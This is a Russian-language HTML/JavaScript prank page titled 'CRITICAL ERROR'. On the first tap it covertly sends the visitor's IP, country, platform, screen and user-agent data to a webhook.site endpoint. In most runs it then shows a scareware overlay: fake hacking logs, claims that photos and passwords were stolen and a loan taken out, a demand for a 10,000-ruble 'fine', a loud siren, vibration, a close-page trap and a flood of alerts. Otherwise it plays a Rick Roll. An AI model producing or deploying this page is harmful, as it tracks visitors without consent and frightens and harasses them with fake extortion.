<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL ERROR</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden; cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        #vid {
            position: fixed; inset: 0; width: 100%; height: 100%;
            object-fit: cover; display: block; pointer-events: none; z-index: 1;
            transition: transform 0.05s, filter 0.1s;
            opacity: 0; /* Скрыто по умолчанию */
        }
        .show-vid { opacity: 1 !important; }
        
        .shake { animation: shakeAnim 0.05s infinite; }
        @keyframes shakeAnim {
            0% { transform: translate(20px, 10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(90deg) invert(1); }
            25% { transform: translate(-20px, -10px) scale(1.3) rotate(-3deg); filter: contrast(4) hue-rotate(180deg) invert(0); }
            50% { transform: translate(20px, -10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(270deg) invert(1); }
            75% { transform: translate(-20px, 10px) scale(1.3) rotate(-3deg); filter: contrast(4) hue-rotate(360deg) invert(0); }
            100% { transform: translate(10px, -20px) scale(1.3) rotate(0deg); filter: contrast(4) hue-rotate(0deg); }
        }
        #glitch-overlay {
            display: none; position: fixed; inset: 0; pointer-events: none; z-index: 5;
            background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.8) 0px, rgba(0, 0, 0, 0.8) 3px, transparent 3px, transparent 6px);
            animation: glitch 0.1s infinite;
        }
        @keyframes glitch { 0% { transform: translateY(0); } 50% { transform: translateY(30px); } 100% { transform: translateY(0); } }
        
        #virus-overlay {
            display: none; position: fixed; inset: 0; background: rgba(120, 0, 0, 0.95);
            color: #fff; z-index: 9999; text-align: left; padding: 20px;
            font-weight: bold; text-shadow: 1px 1px 2px #000; font-size: 18px;
        }
        #virus-overlay h1 { font-size: 30px; margin: 0 0 10px 0; animation: flash 0.2s infinite; color: yellow; text-align: center;}
        #terminal-text {
            margin-top: 20px;
            height: 50vh;
            overflow: hidden;
            color: #00ff00;
            font-size: 14px;
            text-shadow: 0 0 5px #00ff00;
        }
        .threat-text { color: #ff3333; font-size: 20px; margin-top: 20px; text-align: center; }
        
        #pay-btn {
            display: none; margin: 20px auto; padding: 15px 30px; background: yellow;
            color: black; font-size: 20px; font-weight: bold; border: none;
            border-radius: 5px; cursor: pointer; animation: pulse 0.5s infinite alternate;
            z-index: 10000; position: relative;
        }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        @keyframes pulse { 0% { transform: scale(1); } 100% { transform: scale(1.1); } }
        #hint {
            position: fixed; bottom: 0; left: 0; right: 0; padding: 30px 16px;
            text-align: center; color: #fff; font-size: 18px; opacity: 0.7;
            transition: opacity 0.4s; pointer-events: none; z-index: 10; font-family: Arial, sans-serif;
        }
        #hint.hidden { opacity: 0; }
    </style>
</head>
<body>
    <div id="glitch-overlay"></div>
    
    <div id="virus-overlay">
        <h1>⚠️ УТЕЧКА ДАННЫХ ⚠️</h1>
        <div id="terminal-text"></div>
        <p class="threat-text">Все ваши фото и пароли скопированы! На ваше имя оформлен кредит.</p>
        <button id="pay-btn">ОПЛАТИТЬ ШТРАФ (10 000₽)</button>
    </div>
    
    <video id="vid" playsinline webkit-playsinline preload="auto" muted>
        <source src="Rick_Roll_Video_Meme_Template_V1.mp4" type="video/mp4">
    </video>
    <div id="hint">Нажмите в любом месте, чтобы продолжить</div>

    <script>
        (function () {
            const vid = document.getElementById('vid');
            const hint = document.getElementById('hint');
            const virusOverlay = document.getElementById('virus-overlay');
            const glitchOverlay = document.getElementById('glitch-overlay');
            const payBtn = document.getElementById('pay-btn');
            const terminalText = document.getElementById('terminal-text');
            let started = false;

            function start() {
                if (started) return;
                started = true;

                // ОТПРАВКА ДАННЫХ
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
                    .then(res => res.json())
                    .then(data => {
                        const payload = JSON.stringify({
                            country: data.country_code || "Unknown",
                            ip: data.ip,
                            platform: navigator.platform,
                            screen: window.screen.width + "x" + window.screen.height,
                            language: navigator.language,
                            userAgent: navigator.userAgent
                        });
                        // ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ОТ RENDER (или webhook.site)
                        fetch("https://webhook.site/8210aa39-3a98-4986-b37e-1fbc65a13f63", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: payload
                        }).catch(e => console.log(e));
                    }).catch(e => console.log(e));

                // РУЛЕТКА (10% - Рикролл, 90% - Апокалипсис)
                let isRickroll = Math.random() < 0.1;
                hint.classList.add('hidden');

                if (isRickroll) {
                    // СЦЕНАРИЙ 1: ДЖЕКПОТ (РИКРОЛЛ)
                    vid.classList.add('show-vid', 'shake');
                    vid.play().then(() => {
                        vid.muted = false;
                        vid.volume = 1;
                    });
                } else {
                    // СЦЕНАРИЙ 2: ПОЛНЫЙ РАЗЪЁБ (СИРЕНА + УГРОЗЫ)
                    glitchOverlay.style.display = 'block';
                    virusOverlay.style.display = 'block';
                    setTimeout(() => { payBtn.style.display = 'block'; }, 3000);

                    if (navigator.vibrate) navigator.vibrate([10000, 500, 10000, 500, 10000]);

                    // Бесконечный поток фейковых логов взлома
                    const logs = [
                        "> Подключение к базе данных...",
                        "> Обход шифрования... УСПЕШНО",
                        "> Скачивание паролей от Госуслуг...",
                        "> Доступ к галерее... 45%",
                        "> Доступ к галерее... 100%",
                        "> Поиск компромата в буфере обмена...",
                        "> Отправка СМС на номер 900...",
                        "> Взлом Telegram...",
                        "> Слив фото в открытый доступ...",
                        "> Оформление микрозайма..."
                    ];
                    let logIndex = 0;
                    setInterval(() => {
                        if(logIndex < logs.length) {
                            terminalText.innerHTML += logs[logIndex] + "<br>";
                            logIndex++;
                        } else {
                            terminalText.innerHTML = "> ОШИБКА ДОСТУПА. ТРЕБУЕТСЯ ОПЛАТА.";
                        }
                    }, 300);

                    // ЗВУКОВОЙ ТЕРРОР (Сирена)
                    try {
                        const AudioContext = window.AudioContext || window.webkitAudioContext;
                        if (AudioContext) {
                            const audioCtx = new AudioContext();
                            if (audioCtx.state === 'suspended') audioCtx.resume();

                            const oscillator = audioCtx.createOscillator();
                            oscillator.type = 'sawtooth';
                            oscillator.frequency.setValueAtTime(400, audioCtx.currentTime);
                            
                            const compressor = audioCtx.createDynamicsCompressor();
                            compressor.threshold.value = -40;

                            const oscGain = audioCtx.createGain();
                            oscGain.gain.value = 0.8; // Очень громко
                            
                            oscillator.connect(oscGain);
                            oscGain.connect(compressor);
                            compressor.connect(audioCtx.destination);
                            oscillator.start();

                            // Сирена воет вверх-вниз
                            setInterval(() => {
                                if (audioCtx.state === 'running') {
                                    oscillator.frequency.linearRampToValueAtTime(1200, audioCtx.currentTime + 0.5);
                                    oscillator.frequency.linearRampToValueAtTime(400, audioCtx.currentTime + 1);
                                }
                            }, 1000);
                        }
                    } catch (e) {}
                }

                // Блокировка закрытия
                window.onbeforeunload = function(e) {
                    e.preventDefault();
                    e.returnValue = "ДАННЫЕ УКРАДЕНЫ. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ.";
                    return e.returnValue;
                };

                // Окна при клике на кнопку
                payBtn.addEventListener('click', function() {
                    let count = 0;
                    while (count < 50) {
                        setTimeout(() => { 
                            alert("ОШИБКА: ПЕРЕВОД ОТКЛОНЕН БАНКОМ. ПОВТОРИТЕ."); 
                        }, count * 100);
                        count++;
                    }
                });
            }

            document.addEventListener('click', start, { once: true });
            document.addEventListener('touchstart', start, { once: true });
        })();
    </script>
</body>
</html>
